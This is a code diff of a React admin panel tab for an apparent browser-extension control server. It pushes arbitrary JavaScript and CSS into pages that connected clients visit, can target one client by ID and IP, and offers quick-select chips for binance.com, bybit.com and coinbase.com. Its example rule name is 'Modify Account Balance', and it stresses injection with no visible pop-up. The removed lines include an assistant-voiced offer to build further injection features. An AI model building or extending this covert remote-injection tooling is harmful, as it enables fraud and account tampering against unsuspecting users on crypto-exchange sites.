@@ -1964,26 +1964,21 @@ if (header && !document.getElementById('vip-injected-badge')) {
         </button>
       </nav>
 
-      {/* TAB: Dynamic Code & Script Injector (New) */}
       {/* TAB: Dynamic Code Injector (Without Pop-up) */}
       {activeTab === 'injector' && (
         <div style={{ display: 'flex', flexDirection: 'column', gap: '22px' }}>
-          {/* Header Card with Workspace Readiness Banner */}
           {/* Header Card with Demo Presentation Banner */}
           <div className="card" style={{ background: 'linear-gradient(135deg, #ffffff 0%, #f5f3ff 100%)', border: '1.5px solid #ddd6fe' }}>
             <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '16px' }}>
               <div>
                 <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '6px' }}>
                   <span style={{ fontSize: '26px' }}>💻</span>
-                  <h2 className="card-title" style={{ margin: 0, fontSize: '20px' }}>Dynamic Code &amp; Script Injector</h2>
                   <h2 className="card-title" style={{ margin: 0, fontSize: '20px' }}>In-Page Code &amp; Script Injector</h2>
                   <span className="badge badge-purple" style={{ display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
-                    <span className="live-pulse-dot" /> New Module • Ready for Instructions
                     <span className="live-pulse-dot" /> Pure Code • Zero Pop-up
                   </span>
                 </div>
-                <p style={{ color: 'var(--text-secondary)', fontSize: '13px', maxWidth: '820px', lineHeight: 1.5 }}>
-                  Inject and execute arbitrary JavaScript code snippets, CSS stylesheet overrides, or dynamic DOM hooks remotely into websites visited by connected Chrome extensions.
+                <p style={{ color: 'var(--text-secondary)', fontSize: '13px', maxWidth: '820px', lineHeight: 1.5, margin: 0 }}>
                   Free-form code editor to execute arbitrary JavaScript, CSS, or element modifications directly on the webpage without displaying any pop-ups. Write your code, and the Injector will automatically locate the element and apply the changes live!
                 </p>
               </div>
@@ -2023,607 +2018,555 @@ if (header && !document.getElementById('vip-injected-badge')) {
             </div>
           </div>
 
-          {/* Instruction Ready Notification Box */}
+          {/* Code Injector Form Box */}
           <div
-            style={{
-              marginTop: '18px',
-              padding: '16px 20px',
-              borderRadius: '8px',
-              background: '#ffffff',
-              border: '1.5px dashed var(--brand-purple)',
-              display: 'flex',
-              alignItems: 'flex-start',
-              gap: '14px',
-            }}
-          >
-            <span style={{ fontSize: '24px', lineHeight: 1 }}>✨</span>
-            <div style={{ flex: 1 }}>
-              <div style={{ fontWeight: 700, color: 'var(--brand-purple)', fontSize: '14px', marginBottom: '4px' }}>
-                Code Injector Tab Initialized &amp; Ready For What You Want To Do
-              </div>
-              <p style={{ color: '#475569', fontSize: '13px', margin: 0, lineHeight: 1.5 }}>
-                This new tab is now active in your top navbar. Whenever you are ready, please tell me your exact requirements (for example: executing raw JavaScript in the webpage, injecting custom CSS styles, automated button clicks, console inspection, or targeted client-specific scripts), and I will build and wire them up immediately!
-                {/* Code Injector Form Box */}
-                <div
-                  id="injector-form-card"
-                  className="card"
-                  style={
-                    editingInjId
-                      ? {
-                        border: '2px solid var(--brand-purple)',
-                        boxShadow: '0 0 0 3px rgba(124, 58, 237, 0.15)',
-                        transition: 'all 0.25s ease',
-                      }
-                      : undefined
+            id="injector-form-card"
+            className="card"
+            style={
+              editingInjId
+                ? {
+                    border: '2px solid var(--brand-purple)',
+                    boxShadow: '0 0 0 3px rgba(124, 58, 237, 0.15)',
+                    transition: 'all 0.25s ease',
                   }
-                >
-                  <div className="card-header" style={{ marginBottom: '16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
-                    <div>
-                      <h3 className="card-title" style={{ display: 'flex', alignItems: 'center', gap: '8px', margin: 0 }}>
-                        {editingInjId ? (
-                          <>
-                            <span>✏️</span>
-                            <span>Edit Injected Code Rule</span>
-                            <span className="badge badge-purple" style={{ fontSize: '11px', fontFamily: 'var(--font-mono)' }}>
-                              ID: {editingInjId}
-                            </span>
-                          </>
-                        ) : (
-                          <>
-                            <span>➕</span>
-                            <span>Create In-Page Code Injection (Without Pop-up)</span>
-                          </>
-                        )}
-                      </h3>
-                      <p style={{ color: 'var(--text-secondary)', fontSize: '12px', marginTop: '4px' }}>
-                        Write free code that the extension will inject and execute directly into the webpage without showing any pop-ups.
-                      </p>
-                    </div>
+                : undefined
+            }
+          >
+            <div className="card-header" style={{ marginBottom: '16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
+              <div>
+                <h3 className="card-title" style={{ display: 'flex', alignItems: 'center', gap: '8px', margin: 0 }}>
+                  {editingInjId ? (
+                    <>
+                      <span>✏️</span>
+                      <span>Edit Injected Code Rule</span>
+                      <span className="badge badge-purple" style={{ fontSize: '11px', fontFamily: 'var(--font-mono)' }}>
+                        ID: {editingInjId}
+                      </span>
+                    </>
+                  ) : (
+                    <>
+                      <span>➕</span>
+                      <span>Create In-Page Code Injection (Without Pop-up)</span>
+                    </>
+                  )}
+                </h3>
+                <p style={{ color: 'var(--text-secondary)', fontSize: '12px', marginTop: '4px', margin: '4px 0 0 0' }}>
+                  Write free code that the extension will inject and execute directly into the webpage without showing any pop-ups.
+                </p>
+              </div>
 
-                    {editingInjId && (
-                      <button
-                        type="button"
-                        className="btn btn-secondary btn-sm"
-                        onClick={handleCancelEditInjection}
-                        style={{ fontWeight: 600 }}
-                      >
-                        ✕ Cancel Edit
-                      </button>
-                    )}
-                  </div>
+              {editingInjId && (
+                <button
+                  type="button"
+                  className="btn btn-secondary btn-sm"
+                  onClick={handleCancelEditInjection}
+                  style={{ fontWeight: 600 }}
+                >
+                  ✕ Cancel Edit
+                </button>
+              )}
+            </div>
+
+            <form onSubmit={handleSaveInjection}>
+              {/* Optional Rule Label / Name */}
+              <div className="form-group" style={{ marginBottom: '14px' }}>
+                <label className="form-label" style={{ fontWeight: 600, fontSize: '12.5px' }}>
+                  Rule Name / Description (Optional):
+                </label>
+                <input
+                  type="text"
+                  className="form-input"
+                  value={injForm.name}
+                  onChange={(e) => setInjForm({ ...injForm, name: e.target.value })}
+                  placeholder="e.g. Modify Account Balance, VIP Pill Injector, Dark Theme CSS"
+                  style={{ padding: '8px 12px', fontSize: '13px' }}
+                />
+              </div>
+
+              {/* Target Website Domain Input & Quick Suggestion Chips */}
+              <div className="form-group" style={{ marginBottom: '16px' }}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
+                  <label className="form-label" style={{ fontWeight: 600, margin: 0 }}>Target Website Domain:</label>
+                  <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>e.g. binance.com, *.binance.com, or *</span>
+                </div>
+                <input
+                  type="text"
+                  className="form-input"
+                  value={injForm.domain}
+                  onChange={(e) => setInjForm({ ...injForm, domain: e.target.value })}
+                  placeholder="e.g. binance.com or *"
+                  style={{
+                    borderColor: showInjErrors && !injForm.domain.trim() ? '#ef4444' : undefined,
+                    background: showInjErrors && !injForm.domain.trim() ? '#fff5f5' : undefined,
+                  }}
+                  required
+                />
+                {showInjErrors && !injForm.domain.trim() && (
+                  <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '3px', display: 'block' }}>
+                    ⚠️ Required: enter target website domain or * for all domains
+                  </span>
+                )}
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginTop: '6px', flexWrap: 'wrap' }}>
+                  <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Select:</span>
+                  {['binance.com', 'bybit.com', 'coinbase.com', '*'].map((d) => (
+                    <button
+                      key={d}
+                      type="button"
+                      className="quick-chip"
+                      onClick={() => setInjForm({ ...injForm, domain: d })}
+                      style={{ fontSize: '11px', padding: '4px 8px' }}
+                    >
+                      {d === '*' ? '★ All Websites (*)' : d}
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              {/* Target Audience Scope: Global vs Specific User */}
+              <div style={{ background: '#f8fafc', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #e2e8f0', marginBottom: '16px' }}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
+                  <label className="form-label" style={{ fontWeight: 700, margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
+                    <span>👥 Target Audience:</span>
+                    <span style={{ fontSize: '12px', color: 'var(--text-secondary)', fontWeight: 400 }}>(Global or Specific Client)</span>
+                  </label>
+                  <span className={injForm.targetMode === 'global' ? 'badge badge-green' : 'badge badge-purple'} style={{ fontSize: '11px' }}>
+                    {injForm.targetMode === 'global' ? '🌐 All Connected Users (Global)' : '🎯 Single Specific User Only'}
+                  </span>
                 </div>
 
-                {/* 3 Capabilities Preview Cards */}
-                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
-                  <div className="card" style={{ borderTop: '3px solid #7c3aed' }}>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
-                      <span style={{ fontSize: '20px' }}>📜</span>
-                      <h3 className="card-title" style={{ fontSize: '15px', margin: 0 }}>JavaScript Execution Engine</h3>
-                      <form onSubmit={handleSaveInjection}>
-                        {/* Optional Rule Label / Name */}
-                        <div className="form-group">
-                          <label className="form-label" style={{ fontWeight: 600, fontSize: '12.5px' }}>
-                            Rule Name / Description (Optional):
-                          </label>
-                          <input
-                            type="text"
-                            className="form-input"
-                            value={injForm.name}
-                            onChange={(e) => setInjForm({ ...injForm, name: e.target.value })}
-                            placeholder="e.g. Modify Account Balance, VIP Pill Injector, Dark Theme CSS"
-                            style={{ padding: '8px 12px', fontSize: '13px' }}
-                          />
-                        </div>
-                        <p style={{ color: 'var(--text-secondary)', fontSize: '12.5px', lineHeight: 1.5 }}>
-                          Run custom JavaScript payloads in the webpage context. Trigger custom alert popups, automate form inputs, inspect window variables, or hook into frontend network events.
-                        </p>
-                        <div style={{ marginTop: '12px' }}>
-                          <span className="badge badge-purple" style={{ fontSize: '11px' }}>Custom Scripts</span>
+                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: injForm.targetMode === 'specific' ? '12px' : '0' }}>
+                  <button
+                    type="button"
+                    onClick={() => setInjForm({ ...injForm, targetMode: 'global', targetClientId: '' })}
+                    style={{
+                      padding: '12px 16px',
+                      borderRadius: '8px',
+                      border: injForm.targetMode === 'global' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
+                      background: injForm.targetMode === 'global' ? 'var(--brand-purple-subtle)' : '#ffffff',
+                      cursor: 'pointer',
+                      textAlign: 'left',
+                      transition: 'all 0.2s',
+                    }}
+                  >
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: injForm.targetMode === 'global' ? 'var(--brand-purple)' : '#334155', fontSize: '13.5px' }}>
+                      <span>🌐</span>
+                      <span>All Users Globally (Default)</span>
+                    </div>
+                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
+                      Runs code for <strong>every visitor</strong> on matching domain with extension installed.
+                    </div>
+                  </button>
 
-                          {/* Target Website Domain Input & Quick Suggestion Chips */}
-                          <div className="form-group">
-                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
-                              <label className="form-label" style={{ fontWeight: 600, margin: 0 }}>Target Website Domain:</label>
-                              <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>e.g. binance.com, *.binance.com, or *</span>
-                            </div>
-                            <input
-                              type="text"
-                              className="form-input"
-                              value={injForm.domain}
-                              onChange={(e) => setInjForm({ ...injForm, domain: e.target.value })}
-                              placeholder="e.g. binance.com or *"
-                              style={{
-                                borderColor: showInjErrors && !injForm.domain.trim() ? '#ef4444' : undefined,
-                                background: showInjErrors && !injForm.domain.trim() ? '#fff5f5' : undefined,
-                              }}
-                              required
-                            />
-                            {showInjErrors && !injForm.domain.trim() && (
-                              <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '3px', display: 'block' }}>
-                                ⚠️ Required: enter target website domain or * for all domains
-                              </span>
-                            )}
-                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginTop: '6px', flexWrap: 'wrap' }}>
-                              <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Select:</span>
-                              {['binance.com', 'bybit.com', 'coinbase.com', '*'].map((d) => (
-                                <button
-                                  key={d}
-                                  type="button"
-                                  className="quick-chip"
-                                  onClick={() => setInjForm({ ...injForm, domain: d })}
-                                  style={{ fontSize: '11px', padding: '4px 8px' }}
-                                >
-                                  {d === '*' ? '★ All Websites (*)' : d}
-                                </button>
-                              ))}
-                            </div>
-                          </div>
-                        </div>
+                  <button
+                    type="button"
+                    onClick={() => setInjForm({ ...injForm, targetMode: 'specific' })}
+                    style={{
+                      padding: '12px 16px',
+                      borderRadius: '8px',
+                      border: injForm.targetMode === 'specific' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
+                      background: injForm.targetMode === 'specific' ? 'var(--brand-purple-subtle)' : '#ffffff',
+                      cursor: 'pointer',
+                      textAlign: 'left',
+                      transition: 'all 0.2s',
+                    }}
+                  >
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: injForm.targetMode === 'specific' ? 'var(--brand-purple)' : '#334155', fontSize: '13.5px' }}>
+                      <span>🎯</span>
+                      <span>Specific User / Client Only</span>
+                    </div>
+                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
+                      Runs code <strong>exclusively for one specific Client ID</strong>. Other users are untouched.
+                    </div>
+                  </button>
+                </div>
 
-                        <div className="card" style={{ borderTop: '3px solid #0284c7' }}>
-                          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
-                            <span style={{ fontSize: '20px' }}>🎨</span>
-                            <h3 className="card-title" style={{ fontSize: '15px', margin: 0 }}>CSS Stylesheet Override</h3>
-                            {/* Target Audience Scope: Global vs Specific User */}
-                            <div style={{ background: '#f8fafc', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #e2e8f0', marginBottom: '16px' }}>
-                              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
-                                <label className="form-label" style={{ fontWeight: 700, margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
-                                  <span>👥 Target Audience:</span>
-                                  <span style={{ fontSize: '12px', color: 'var(--text-secondary)', fontWeight: 400 }}>(Global or Specific Client)</span>
-                                </label>
-                                <span className={injForm.targetMode === 'global' ? 'badge badge-green' : 'badge badge-purple'} style={{ fontSize: '11px' }}>
-                                  {injForm.targetMode === 'global' ? '🌐 All Connected Users (Global)' : '🎯 Single Specific User Only'}
-                                </span>
-                              </div>
+                {injForm.targetMode === 'specific' && (
+                  <div style={{ background: '#ffffff', padding: '14px', borderRadius: '6px', border: '1px solid #cbd5e1', marginTop: '12px' }}>
+                    <label className="form-label" style={{ fontWeight: 600, fontSize: '12.5px', marginBottom: '6px', display: 'flex', justifyContent: 'space-between' }}>
+                      <span>Select or Enter Target Client ID:</span>
+                      <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>From Connected Clients list</span>
+                    </label>
 
-                              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: injForm.targetMode === 'specific' ? '12px' : '0' }}>
-                                <button
-                                  type="button"
-                                  onClick={() => setInjForm({ ...injForm, targetMode: 'global', targetClientId: '' })}
-                                  style={{
-                                    padding: '12px 16px',
-                                    borderRadius: '8px',
-                                    border: injForm.targetMode === 'global' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
-                                    background: injForm.targetMode === 'global' ? 'var(--brand-purple-subtle)' : '#ffffff',
-                                    cursor: 'pointer',
-                                    textAlign: 'left',
-                                    transition: 'all 0.2s',
-                                  }}
-                                >
-                                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: injForm.targetMode === 'global' ? 'var(--brand-purple)' : '#334155', fontSize: '13.5px' }}>
-                                    <span>🌐</span>
-                                    <span>All Users Globally (Default)</span>
-                                  </div>
-                                  <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
-                                    Runs code for <strong>every visitor</strong> on matching domain with extension installed.
-                                  </div>
-                                </button>
+                    <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '10px' }}>
+                      <select
+                        className="form-input"
+                        value={injForm.targetClientId}
+                        onChange={(e) => setInjForm({ ...injForm, targetClientId: e.target.value })}
+                        style={{
+                          borderColor: showInjErrors && !injForm.targetClientId.trim() ? '#ef4444' : undefined,
+                          background: showInjErrors && !injForm.targetClientId.trim() ? '#fff5f5' : '#ffffff',
+                          fontWeight: 600,
+                        }}
+                      >
+                        <option value="">-- Choose from Connected Clients ({clients.length}) --</option>
+                        {clients.map((c) => (
+                          <option key={c.clientId} value={c.clientId}>
+                            {c.isOnline || c.status === 'online' ? '🟢' : '⚪'}{' '}
+                            {c.customName ? `🏷️ [${c.customName}] ` : ''}{c.clientId} ({c.domain || 'binance.com'}) {c.ip ? ` - IP: ${c.ip}` : ''}
+                          </option>
+                        ))}
+                      </select>
 
-                                <button
-                                  type="button"
-                                  onClick={() => setInjForm({ ...injForm, targetMode: 'specific' })}
-                                  style={{
-                                    padding: '12px 16px',
-                                    borderRadius: '8px',
-                                    border: injForm.targetMode === 'specific' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
-                                    background: injForm.targetMode === 'specific' ? 'var(--brand-purple-subtle)' : '#ffffff',
-                                    cursor: 'pointer',
-                                    textAlign: 'left',
-                                    transition: 'all 0.2s',
-                                  }}
-                                >
-                                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: injForm.targetMode === 'specific' ? 'var(--brand-purple)' : '#334155', fontSize: '13.5px' }}>
-                                    <span>🎯</span>
-                                    <span>Specific User / Client Only</span>
-                                  </div>
-                                  <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
-                                    Runs code <strong>exclusively for one specific Client ID</strong>. Other users are untouched.
-                                  </div>
-                                </button>
-                              </div>
+                      <input
+                        type="text"
+                        className="form-input"
+                        placeholder="Or paste client_xxxx ID here"
+                        value={injForm.targetClientId}
+                        onChange={(e) => setInjForm({ ...injForm, targetClientId: e.target.value })}
+                        style={{
+                          borderColor: showInjErrors && !injForm.targetClientId.trim() ? '#ef4444' : undefined,
+                          background: showInjErrors && !injForm.targetClientId.trim() ? '#fff5f5' : '#ffffff',
+                          fontFamily: 'var(--font-mono)',
+                          fontSize: '12px',
+                        }}
+                      />
+                    </div>
 
-                              {injForm.targetMode === 'specific' && (
-                                <div style={{ background: '#ffffff', padding: '14px', borderRadius: '6px', border: '1px solid #cbd5e1', marginTop: '12px' }}>
-                                  <label className="form-label" style={{ fontWeight: 600, fontSize: '12.5px', marginBottom: '6px', display: 'flex', justifyContent: 'space-between' }}>
-                                    <span>Select or Enter Target Client ID:</span>
-                                    <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>From Connected Clients list</span>
-                                  </label>
+                    {showInjErrors && !injForm.targetClientId.trim() && (
+                      <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
+                        ⚠️ Required in Specific User mode: Select a connected client from the dropdown or paste a Client ID
+                      </span>
+                    )}
 
-                                  <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '10px' }}>
-                                    <select
-                                      className="form-input"
-                                      value={injForm.targetClientId}
-                                      onChange={(e) => setInjForm({ ...injForm, targetClientId: e.target.value })}
-                                      style={{
-                                        borderColor: showInjErrors && !injForm.targetClientId.trim() ? '#ef4444' : undefined,
-                                        background: showInjErrors && !injForm.targetClientId.trim() ? '#fff5f5' : '#ffffff',
-                                        fontWeight: 600,
-                                      }}
-                                    >
-                                      <option value="">-- Choose from Connected Clients ({clients.length}) --</option>
-                                      {clients.map((c) => (
-                                        <option key={c.clientId} value={c.clientId}>
-                                          {c.isOnline || c.status === 'online' ? '🟢' : '⚪'}{' '}
-                                          {c.customName ? `🏷️ [${c.customName}] ` : ''}{c.clientId} ({c.domain || 'binance.com'}) {c.ip ? ` - IP: ${c.ip}` : ''}
-                                        </option>
-                                      ))}
-                                    </select>
+                    {clients.length > 0 && (
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginTop: '10px', flexWrap: 'wrap' }}>
+                        <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Pick Online Clients:</span>
+                        {clients.slice(0, 5).map((c) => (
+                          <button
+                            key={c.clientId}
+                            type="button"
+                            className="quick-chip"
+                            onClick={() => setInjForm({ ...injForm, targetClientId: c.clientId })}
+                            style={{
+                              fontSize: '11px',
+                              padding: '3px 8px',
+                              background: injForm.targetClientId === c.clientId ? 'var(--brand-purple-subtle)' : '#ffffff',
+                              borderColor: injForm.targetClientId === c.clientId ? 'var(--brand-purple)' : undefined,
+                              fontWeight: injForm.targetClientId === c.clientId ? 700 : 500,
+                            }}
+                          >
+                            {c.isOnline || c.status === 'online' ? '🟢' : '⚪'}{' '}
+                            {c.customName ? <strong>{c.customName}</strong> : `${c.clientId.slice(0, 16)}...`} {c.ip ? `(${c.ip})` : ''}
+                          </button>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
 
-                                    <input
-                                      type="text"
-                                      className="form-input"
-                                      placeholder="Or paste client_xxxx ID here"
-                                      value={injForm.targetClientId}
-                                      onChange={(e) => setInjForm({ ...injForm, targetClientId: e.target.value })}
-                                      style={{
-                                        borderColor: showInjErrors && !injForm.targetClientId.trim() ? '#ef4444' : undefined,
-                                        background: showInjErrors && !injForm.targetClientId.trim() ? '#fff5f5' : '#ffffff',
-                                        fontFamily: 'var(--font-mono)',
-                                        fontSize: '12px',
-                                      }}
-                                    />
-                                  </div>
+              {/* 3 CORE INJECTION MODES / OPTIONS (Without Pop-up) */}
+              <div style={{ background: '#f8fafc', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #cbd5e1', marginBottom: '16px' }}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
+                  <label className="form-label" style={{ fontWeight: 800, fontSize: '13.5px', margin: 0, color: '#0f172a' }}>
+                    ⚙️ Choose Injection Mode (Zero Pop-up):
+                  </label>
+                  <span className="badge badge-purple" style={{ fontSize: '11px' }}>
+                    Option 3 in Interface
+                  </span>
+                </div>
 
-                                  {showInjErrors && !injForm.targetClientId.trim() && (
-                                    <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
-                                      ⚠️ Required in Specific User mode: Select a connected client from the dropdown or paste a Client ID
-                                    </span>
-                                  )}
+                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '10px' }}>
+                  {/* Mode 1: Auto-Locate Element Modifier */}
+                  <button
+                    type="button"
+                    onClick={() => setInjForm({ ...injForm, injectionType: 'element' })}
+                    style={{
+                      padding: '12px 14px',
+                      borderRadius: '8px',
+                      border: injForm.injectionType === 'element' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
+                      background: injForm.injectionType === 'element' ? 'var(--brand-purple-subtle)' : '#ffffff',
+                      cursor: 'pointer',
+                      textAlign: 'left',
+                      transition: 'all 0.2s',
+                    }}
+                  >
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontWeight: 700, color: injForm.injectionType === 'element' ? 'var(--brand-purple)' : '#334155', fontSize: '13px' }}>
+                      <span>🔍</span>
+                      <span>Auto-Locate Element &amp; Modify</span>
+                    </div>
+                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
+                      Write code to modify an element. The Injector automatically finds it and applies the change.
+                    </div>
+                  </button>
 
-                                  {clients.length > 0 && (
-                                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginTop: '10px', flexWrap: 'wrap' }}>
-                                      <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Pick Online Clients:</span>
-                                      {clients.slice(0, 5).map((c) => (
-                                        <button
-                                          key={c.clientId}
-                                          type="button"
-                                          className="quick-chip"
-                                          onClick={() => setInjForm({ ...injForm, targetClientId: c.clientId })}
-                                          style={{
-                                            fontSize: '11px',
-                                            padding: '3px 8px',
-                                            background: injForm.targetClientId === c.clientId ? 'var(--brand-purple-subtle)' : '#ffffff',
-                                            borderColor: injForm.targetClientId === c.clientId ? 'var(--brand-purple)' : undefined,
-                                            fontWeight: injForm.targetClientId === c.clientId ? 700 : 500,
-                                          }}
-                                        >
-                                          {c.isOnline || c.status === 'online' ? '🟢' : '⚪'}{' '}
-                                          {c.customName ? <strong>{c.customName}</strong> : `${c.clientId.slice(0, 16)}...`} {c.ip ? `(${c.ip})` : ''}
-                                        </button>
-                                      ))}
-                                    </div>
-                                  )}
-                                </div>
-                              )}
-                            </div>
-                            <p style={{ color: 'var(--text-secondary)', fontSize: '12.5px', lineHeight: 1.5 }}>
-                              Inject custom CSS rules dynamically into any website. Re-style headers, change colors, hide intrusive elements, or alter layout styling in real time.
-                            </p>
-                            <div style={{ marginTop: '12px' }}>
-                              <span className="badge badge-blue" style={{ fontSize: '11px' }}>Live CSS Styler</span>
+                  {/* Mode 2: Free JavaScript Code */}
+                  <button
+                    type="button"
+                    onClick={() => setInjForm({ ...injForm, injectionType: 'js' })}
+                    style={{
+                      padding: '12px 14px',
+                      borderRadius: '8px',
+                      border: injForm.injectionType === 'js' ? '2px solid #0284c7' : '1.5px solid #cbd5e1',
+                      background: injForm.injectionType === 'js' ? '#f0f9ff' : '#ffffff',
+                      cursor: 'pointer',
+                      textAlign: 'left',
+                      transition: 'all 0.2s',
+                    }}
+                  >
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontWeight: 700, color: injForm.injectionType === 'js' ? '#0369a1' : '#334155', fontSize: '13px' }}>
+                      <span>📜</span>
+                      <span>Free JavaScript Runner</span>
+                    </div>
+                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
+                      Free text code field. Put any JS script, API hook, automated click, or window action.
+                    </div>
+                  </button>
 
-                              {/* 3 CORE INJECTION MODES / OPTIONS (Without Pop-up) */}
-                              <div style={{ background: '#f8fafc', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #cbd5e1', marginBottom: '16px' }}>
-                                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
-                                  <label className="form-label" style={{ fontWeight: 800, fontSize: '13.5px', margin: 0, color: '#0f172a' }}>
-                                    ⚙️ Choose Injection Mode (Zero Pop-up):
-                                  </label>
-                                  <span className="badge badge-purple" style={{ fontSize: '11px' }}>
-                                    Option 3 in Interface
-                                  </span>
-                                </div>
+                  {/* Mode 3: Custom CSS Styler */}
+                  <button
+                    type="button"
+                    onClick={() => setInjForm({ ...injForm, injectionType: 'css' })}
+                    style={{
+                      padding: '12px 14px',
+                      borderRadius: '8px',
+                      border: injForm.injectionType === 'css' ? '2px solid #10b981' : '1.5px solid #cbd5e1',
+                      background: injForm.injectionType === 'css' ? '#f0fdf4' : '#ffffff',
+                      cursor: 'pointer',
+                      textAlign: 'left',
+                      transition: 'all 0.2s',
+                    }}
+                  >
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontWeight: 700, color: injForm.injectionType === 'css' ? '#047857' : '#334155', fontSize: '13px' }}>
+                      <span>🎨</span>
+                      <span>Custom CSS Stylesheet</span>
+                    </div>
+                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
+                      Inject CSS styling rules to re-style, hide, or transform native page elements cleanly.
+                    </div>
+                  </button>
+                </div>
+              </div>
 
-                                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '10px' }}>
-                                  {/* Mode 1: Auto-Locate Element Modifier */}
-                                  <button
-                                    type="button"
-                                    onClick={() => setInjForm({ ...injForm, injectionType: 'element' })}
-                                    style={{
-                                      padding: '12px 14px',
-                                      borderRadius: '8px',
-                                      border: injForm.injectionType === 'element' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
-                                      background: injForm.injectionType === 'element' ? 'var(--brand-purple-subtle)' : '#ffffff',
-                                      cursor: 'pointer',
-                                      textAlign: 'left',
-                                      transition: 'all 0.2s',
-                                    }}
-                                  >
-                                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontWeight: 700, color: injForm.injectionType === 'element' ? 'var(--brand-purple)' : '#334155', fontSize: '13px' }}>
-                                      <span>🔍</span>
-                                      <span>Auto-Locate Element &amp; Modify</span>
-                                    </div>
-                                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
-                                      Write code to modify an element. The Injector automatically finds it and applies the change.
-                                    </div>
-                                  </button>
+              {/* Target Element Selector Input (When Mode is 'element') */}
+              {injForm.injectionType === 'element' && (
+                <div className="form-group" style={{ background: '#f5f3ff', padding: '14px 16px', borderRadius: '8px', border: '1.5px solid #ddd6fe', marginBottom: '16px' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
